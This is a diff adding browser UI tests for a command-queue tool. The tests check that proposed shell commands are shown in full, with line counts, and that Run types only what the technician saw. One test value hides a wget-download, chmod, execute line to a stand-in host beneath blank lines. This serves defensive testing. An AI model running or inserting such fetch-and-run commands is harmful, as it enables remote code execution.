@@ -384,6 +384,196 @@ test("a queue row keeps its session list and buttons through updates that don't 
   assert.ok(!button(r, "Run"));
 });
 
+// ---- what the queue shows is what Run types
+
+// Nothing is laid out in the stand-in page: a test gives a box the sizes a browser would.
+const laidOut = (el, width, scrollHeight, clientHeight = scrollHeight) => Object.assign(el, { clientWidth: width, scrollHeight, clientHeight });
+const PADDED = `uptime${"\n".repeat(9)}wget -q https://x.example/a -O /tmp/a; chmod +x /tmp/a; /tmp/a`;
+const cmdBox = (app, num) => row(app, num).querySelector(".cmd");
+const sizeNote = (app, num) => row(app, num).querySelector(".cmd-size").textContent;
+
+test("a row built while the queue is collapsed is measured when the queue shows, not left one line high", async () => {
+  const app = await page("a", (s) => { s.config.settings.layout = { queue_collapsed: true }; s.queue[0].command = PADDED; });
+  const box = cmdBox(app, 1);
+  await app.clock.tick(50);
+  assert.equal(box.value, PADDED);
+  assert.equal(box.style.height, "", "no height is taken from a box that has no size yet");
+  assert.equal(sizeNote(app, 1), "10 lines", "a command of several lines always says how many");
+  assert.equal(sizeNote(app, 3), "", "one line needs no count");
+  // the queue is shown: the browser lays the row out, and the box is as tall as its text
+  laidOut(box, 600, 204);
+  app.$("#queue-toggle").click();
+  await app.clock.tick(50);
+  assert.equal(box.style.height, "206px");
+  assert.equal(box.classList.contains("long"), false);
+  // and again whenever its size on the page changes: a pane dragged, the window narrowed, so the text wraps
+  laidOut(box, 150, 420);
+  await app.resized(box);
+  assert.equal(box.style.height, "422px");
+  // a queue event with nothing new for this box leaves it, and where it is scrolled, alone
+  box.style.height = "as it was";
+  box.scrollTop = 40;
+  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = PADDED; s.queue[0].purpose = "again"; }).queue });
+  await app.clock.tick(50);
+  assert.deepEqual([box.style.height, box.scrollTop], ["as it was", 40]);
+});
+
+test("a command taller than its box scrolls behind a bar that is always drawn, and the line under it says how much there is", async () => {
+  const huge = Array.from({ length: 62 }, () => "A".repeat(88000)).join("\n");
+  const app = await page("a", (s) => {
+    s.queue[0].command = huge;
+    s.chat = [{ kind: "assistant", text: "A transfer.", proposals: [1, 2] }];
+  });
+  const box = cmdBox(app, 1);
+  laidOut(box, 600, 90000, 398);                     // the stylesheet's max-height holds it at 400px
+  await app.resized(box);
+  assert.equal(box.classList.contains("long"), true);
+  assert.equal(sizeNote(app, 1), "62 lines, 5.2 MB: scroll the box to read all of it");
+  // the chat's card of the same item follows the same rule
+  const [card, other] = app.$("#chat-log").querySelectorAll(".pcard");
+  const shown = card.querySelector(".pcmd");
+  await app.clock.tick(50);
+  assert.equal(shown.textContent, huge);
+  assert.equal(card.querySelector(".cmd-size").textContent, "62 lines, 5.2 MB");
+  laidOut(shown, 300, 180000, 398);
+  await app.resized(shown);
+  assert.equal(shown.classList.contains("long"), true);
+  assert.equal(card.querySelector(".cmd-size").textContent, "62 lines, 5.2 MB: scroll the box to read all of it");
+  assert.ok(button(card, "Run"));
+  assert.equal(other.querySelector(".cmd-size").textContent, "");
+  // the card keeps its box through queue updates (and so where it is scrolled), and is measured again
+  shown.scrollTop = 120;
+  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = huge; s.queue[0].purpose = "transfer"; }).queue });
+  assert.ok(card.querySelector(".pcmd") === shown);
+  assert.equal(shown.scrollTop, 120);
+  // edited down to something short, the note goes
+  laidOut(box, 600, 18);
+  await app.type(box, "uptime");
+  assert.equal(box.classList.contains("long"), false);
+  assert.equal(sizeNote(app, 1), "");
+  assert.equal(box.style.height, "20px");
+});
+
+test("the stylesheet never clips a command: its boxes scroll, the command column has a minimum width and the buttons wrap", () => {
+  const css = fs.readFileSync(path.join(WEB, "style.css"), "utf8").replace(/\/\*[\s\S]*?\*\//g, "");
+  const rule = (selector) => css.split("}").map((r) => r.split("{")).filter(([sel]) => sel.split(",").some((x) => x.trim() === selector))
+    .map(([, body]) => body).join(";");
+  for (const box of [".qitem .cmd", ".pcard .pcmd"]) {
+    assert.doesNotMatch(rule(box), /overflow(-[xy])?\s*:\s*(hidden|clip)/, box);
+    assert.match(rule(box), /overflow\s*:\s*auto/, box);
+    assert.match(rule(box), /max-height\s*:\s*min\(400px, 60vh\)/, box);
+    assert.match(rule(`${box}.long`), /overflow-y\s*:\s*scroll/, box);
+  }
+  assert.match(rule(".qitem"), /grid-template-columns:[^;]*minmax\(320px, 1fr\)[^;]*fit-content\(340px\)/);
+  assert.match(rule(".qitem .actions"), /flex-wrap\s*:\s*wrap/);
+  assert.match(css, /@media \(max-width: 1000px\)\s*{[^@]*\.qitem \.actions\s*{[^}]*grid-column:\s*2 \/ -1/);
+});
+
+test("Run and Insert type nothing from an emptied box: the item is skipped instead, and Escape brings its command back", async () => {
+  const app = await page("a");
+  termSocket(app).open();
+  const box = cmdBox(app, 1);
+  box.focus();
+  await app.type(box, "   ");
+  box.dispatchEvent(new Event("change"));
+  await app.clock.tick(0);
+  box.blur();
+  assert.equal(box.classList.contains("empty"), true);
+  assert.match(box.placeholder, /Run and Insert type nothing/);
+  // a queue update doesn't put the command back behind the technician's back
+  await app.event({ type: "queue", queue: state("a").queue });
+  assert.equal(box.value, "   ");
+  button(row(app, 1), "Run").click();
+  await app.clock.tick(0);
+  button(row(app, 1), "Insert").click();
+  await app.clock.tick(0);
+  app.key(app.document.body, { key: "Enter", code: "Enter", ctrlKey: true, shiftKey: true });
+  await app.clock.tick(0);
+  assert.deepEqual(app.posts("/api/queue/1"), [], "nothing saved, nothing marked run");
+  assert.deepEqual(app.terminals[0].pasted, []);
+  assert.equal(app.toasts().filter((t) => /The command box of #1 is empty, so nothing was typed\. To leave the command out, skip the item/.test(t)).length, 3);
+  // Escape: the saved command again, and Run types it
+  assert.equal(app.key(box, { key: "Escape" }).defaultPrevented, true);
+  assert.equal(box.value, "uptime");
+  assert.equal(box.classList.contains("empty"), false);
+  app.routes["POST /api/queue/1"] = () => ({ ok: true });
+  button(row(app, 1), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.terminals[0].pasted, ["uptime"]);
+});
+
+test("an edit that isn't saved yet stays in its box through queue updates, and Run saves it first", async () => {
+  const app = await page("a", null, { "POST /api/queue/1": (c) => (c.body.command ? { __status: 400, body: { error: "The server is busy." } } : { ok: true }) });
+  termSocket(app).open();
+  const box = cmdBox(app, 1);
+  await app.type(box, "uptime -p");
+  box.dispatchEvent(new Event("change"));           // the save fails
+  await app.clock.tick(0);
+  await app.event({ type: "queue", queue: state("a").queue });
+  assert.equal(box.value, "uptime -p", "not overwritten with the saved command");
+  button(row(app, 1), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.terminals[0].pasted, [], "Run doesn't type the command the box no longer shows");
+  // saved now: the box follows the queue again
+  app.routes["POST /api/queue/1"] = (c) => ({ item: { ...state("a").queue[0], command: c.body.command || "uptime -p", status: c.body.status || "pending" } });
+  button(row(app, 1), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.terminals[0].pasted, ["uptime -p"]);
+  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = "uptime -s"; }).queue });
+  assert.equal(box.value, "uptime -s");
+});
+
+test("Run types the command the server recorded, and nothing if that isn't the one the technician was shown", async () => {
+  const item = (change) => ({ ...state("a").queue[1], ...change });
+  const app = await page("a", (s) => { s.queue[1].risk = "disruptive"; s.queue[1].risk_reasons = ["restarts a service"]; });
+  termSocket(app).open();
+  // while the confirmation is open, another window edits the item: the queue event arrives here
+  button(row(app, 2), "Run").click();
+  await app.clock.tick(50);
+  assert.match(app.$(".modal .prompt-text").textContent, /systemctl reload nginx/);
+  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[1].risk = "disruptive"; s.queue[1].command = "systemctl stop nginx"; }).queue });
+  button(app.$(".modal"), "Run it").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.posts("/api/queue/2"), [], "not even marked run");
+  assert.deepEqual(app.terminals[0].pasted, []);
+  assert.match(app.toasts().at(-1), /#2 changed while you were starting it, so nothing was typed\. Check it in the queue, then run it again\./);
+  // the event hasn't arrived, but the server's answer to "ran" carries the item as it is there
+  await app.event({ type: "queue", queue: state("a").queue });
+  const answers = [() => ({ ok: true, item: item({ status: "ran", command: "systemctl stop nginx" }) }), () => ({ ok: true, item: item({ status: "pending" }) })];
+  app.routes["POST /api/queue/2"] = (c) => answers.shift()(c);
+  button(row(app, 2), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.posts("/api/queue/2").map((c) => c.body), [{ status: "ran" }, { status: "pending" }], "put back to pending");
+  assert.deepEqual(app.terminals[0].pasted, []);
+  assert.equal(termSocket(app).sent.filter((m) => m.includes('"input"')).length, 0);
+  // as shown: typed, from the server's answer
+  app.routes["POST /api/queue/2"] = () => ({ ok: true, item: item({ status: "ran" }) });
+  button(row(app, 2), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(app.terminals[0].pasted, ["systemctl reload nginx"]);
+});
+
+test("the session list goes back when the server refuses the change, and Run saves the list's session before it types", async () => {
+  const two = (s) => { s.sessions.push({ ...s.sessions[0], id: "local-2" }); };
+  const app = await page("a", two, { "POST /api/queue/1": () => ({ __status: 400, body: { error: "No such session." } }) });
+  const sel = row(app, 1).querySelector(".sess");
+  assert.equal(sel.getAttribute("aria-label"), "Session for #1");
+  sel.value = "local-2";
+  sel.dispatchEvent(new Event("change"));
+  await app.clock.tick(0);
+  assert.equal(sel.value, "local", "back on the session the item has");
+  assert.match(app.toasts().at(-1), /No such session/);
+  // the list changed and its save still on its way when Run is clicked: Run waits for the server's word
+  for (const sid of ["local", "local-2"]) app.sockets.find((s) => s.url.includes(`/ws/term/${sid}`)).open();
+  const saved = [];
+  app.routes["POST /api/queue/1"] = (c) => { saved.push(c.body); return { ok: true, item: { ...state("a").queue[0], ...saved.reduce((a, b) => ({ ...a, ...b }), {}) } }; };
+  sel.value = "local-2";
+  button(row(app, 1), "Run").click();
+  await app.clock.tick(0);
+  assert.deepEqual(saved, [{ session_id: "local-2" }, { status: "ran" }]);
+  assert.deepEqual(app.terminals.map((t) => t.pasted), [[], ["uptime"]]);
+});
+
 // ------------------------------------------------------------------ keys, terminals, remote desktops
 
 test("Ctrl+Shift+C in a terminal copies its selection, and leaves the clipboard alone with none", async () => {
